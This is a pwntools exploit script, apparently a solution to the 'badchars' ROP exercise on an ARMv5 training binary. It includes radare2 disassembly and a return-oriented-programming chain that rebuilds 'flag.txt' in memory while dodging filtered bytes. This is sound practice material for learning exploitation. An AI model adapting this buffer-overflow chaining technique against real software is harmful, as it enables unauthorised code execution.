from pwn import *
context.binary = elf = ELF('badchars_armv5')
offset = 4*11

'''sub_mr5_r6
┌ 24: sym.usefulFunction ();
│           ; var int32_t var_4h @ sp+0x4
│           0x000105d4      00482de9       push {fp, lr}
│           0x000105d8      04b08de2       add fp, var_4h
│           0x000105dc      08009fe5       ldr r0, [str.nonexistent]   ; [0x10698:4]=0x656e6f6e ; "nonexistent"
│           0x000105e0      b3ffffeb       bl sym.imp.print_file
│           0x000105e4      0000a0e1       mov r0, r0                  ; 0x10698 ; "nonexistent"
└           0x000105e8      0088bde8       pop {fp, pc}

[0x000105f0]> s sym.imp.print_file 
[0x000104b4]> pdf
            ; CALL XREF from sym.usefulFunction @ 0x105e0
┌ 12: sym.imp.print_file ();
│           0x000104b4      00c68fe2       add ip, pc, 0, 12
│           0x000104b8      10ca8ce2       add ip, ip, 16, 20
│           ; DATA XREF from sym.imp.print_file @ 0x104b4
└           0x000104bc      5cfbbce5       ldr pc, [ip, 0xb5c]!


;-- usefulGadgets:
0x000105f0      001095e5       ldr r1, [r5]
0x000105f4      061041e0       sub r1, r1, r6
0x000105f8      001085e5       str r1, [r5]
0x000105fc      0180bde8       pop {r0, pc}
0x00010600      001095e5       ldr r1, [r5]
0x00010604      061081e0       add r1, r1, r6
0x00010608      001085e5       str r1, [r5]
0x0001060c      0180bde8       pop {r0, pc}
0x00010610      003084e5       str r3, [r4]
0x00010614      6080bde8       pop {r5, r6, pc}
0x00010618      001095e5       ldr r1, [r5]
0x0001061c      061021e0       eor r1, r1, r6
0x00010620      001085e5       str r1, [r5]
0x00010624      0180bde8       pop {r0, pc}

0x00010610           003084e5  str r3, [r4]
0x00010614           6080bde8  pop {r5, r6, pc}

0x000105b0           1080bde8  pop {r4, pc}


0x00010690: pop {r3, pc}; 


[Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
22  0x00001024    0x8 0x00021024    0x8 -rw- .data


'''

# x g a .
badchars = [0x78, 0x67, 0x61, 0x2e]
# replace with 0x79(y), 0x68(h), 0x62(b), 0x2f (/)


########################vv badchar we cannot use this gadget
#pop_r3_pc    = 0x00010478

pop_r3_pc    = 0x00010690 # but we can use this
pop_r4_pc    = 0x000105b0
pop_r0_pc    = 0x00010624
pop_r5_r6_pc = 0x00010614

str_r3_mr4_pop_r5_r6_pc = 0x00010610
sub_mr5_r6 = 0x000105f0

what1 = unpack(b'flbh')
what2 = unpack(b'/tyt')

where = 0x00021024

print_file = 0x000104b4

payload  = b'A'*offset

r0 = where

# set register r3 and r4 in order to write 'flbh' in .data 
payload += p32(pop_r3_pc) + p32(what1) + p32(pop_r4_pc) +p32(where) 
# write 'flbh' in data and sub 0x1 to .data+2 so 'b'->'a' and 'flbh'->'flah'
payload += p32(str_r3_mr4_pop_r5_r6_pc) + p32(where+2) + p32(0x1) + p32(sub_mr5_r6) + p32(r0)

# set regiters r3 and r4 to write '/tyt' in .data+4
payload += p32(pop_r3_pc) + p32(what2) + p32(pop_r4_pc) +p32(where+4)
# write '/tyt' in .data+4 and sub 0x1 to .data+3 so 'h'->'g' and 'flah/tyt' -> 'flag/tyt'
payload += p32(str_r3_mr4_pop_r5_r6_pc) + p32(where+3) + p32(0x1) + p32(sub_mr5_r6) + p32(r0)

# sub 0x1 to .data+4 and .data+6 so 'flag/tyt'->'flag.txt'
payload += p32(pop_r5_r6_pc) + p32(where + 4) + p32(0x1) + p32(sub_mr5_r6) + p32(r0)
payload += p32(pop_r5_r6_pc) + p32(where + 6) + p32(0x1) + p32(sub_mr5_r6) + p32(r0)

# finally call print file and due to the fact that is the last call in the ropchain 
# I will not use the plt
payload += p32(print_file)


#p = gdb.debug(elf.path)
p = elf.process()

p.recv()
p.sendline(payload)
log.info(p.recvall())




